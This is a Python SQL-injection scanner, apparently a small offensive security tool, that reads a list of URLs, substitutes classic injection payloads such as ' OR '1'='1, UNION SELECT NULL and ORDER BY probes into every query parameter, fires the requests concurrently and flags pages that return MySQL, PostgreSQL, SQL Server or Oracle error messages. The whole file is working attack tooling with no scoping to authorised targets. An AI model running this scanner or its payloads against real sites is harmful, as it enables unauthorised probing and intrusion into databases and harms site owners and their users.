import asyncio
import aiohttp
import urllib.parse
import re
from colorama import init, Fore

red = Fore.RED
reset = Fore.RESET

sem = asyncio.Semaphore(50)
async def sqlScan(url : str, session):
    sql_errors_flags = [
        # MySQL / MariaDB
        r"SQL syntax.*(MySQL|MariaDB)",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"you have an error in your SQL syntax",
        r"check the manual that corresponds to your (MariaDB|MySQL) server version",

        # PostgreSQL
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError",

        # SQL Server
        r"Driver.*SQL SERVER",
        r"OLE DB.*SQL SERVER",
        r"SQL Server.*Driver",
        r"Warning.*mssql_.*",
        r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
        r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver",
        
        # Oracle
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_.*",
        r"Warning.*\Wora_.*",
        
        # Genéricas / otras bases
        r"Syntax error in string in query expression",
        r"Unclosed quotation mark after the character string",
        r"quoted string not properly terminated"
    ]
    try:
        async with sem:
            async with session.get(url, timeout=10) as response:
                response_text = await response.text()
                for error in sql_errors_flags:
                    if re.search(error, response_text, re.IGNORECASE):
                        print(f"{red}[ SQL INJECTION ] {url}{reset}")
    except Exception:
        pass

async def main(listUrls : str):
    task = []
    payloadsSqli = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL, NULL, NULL --",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' ORDER BY 3--+",
        "1 UNION SELECT NULL, NULL, NULL --",
    ]
    with open(listUrls, 'r') as fileRead:
        urls = fileRead.readlines()
    
    async with aiohttp.ClientSession() as session:
        for payload in payloadsSqli:
            for url in urls:
                if "=" in url:
                    urlParsed = urllib.parse.urlparse(url.strip())
                    qs = urllib.parse.parse_qsl(urlParsed.query)
                    qs = [(key, payload) for key,_ in qs]
                    newQuery = urllib.parse.urlencode(qs)
                    urlFull = urllib.parse.urlunparse(urlParsed._replace(query=newQuery))
                    task.append(sqlScan(urlFull, session))
                else:
                    continue
        
        await asyncio.gather(*task)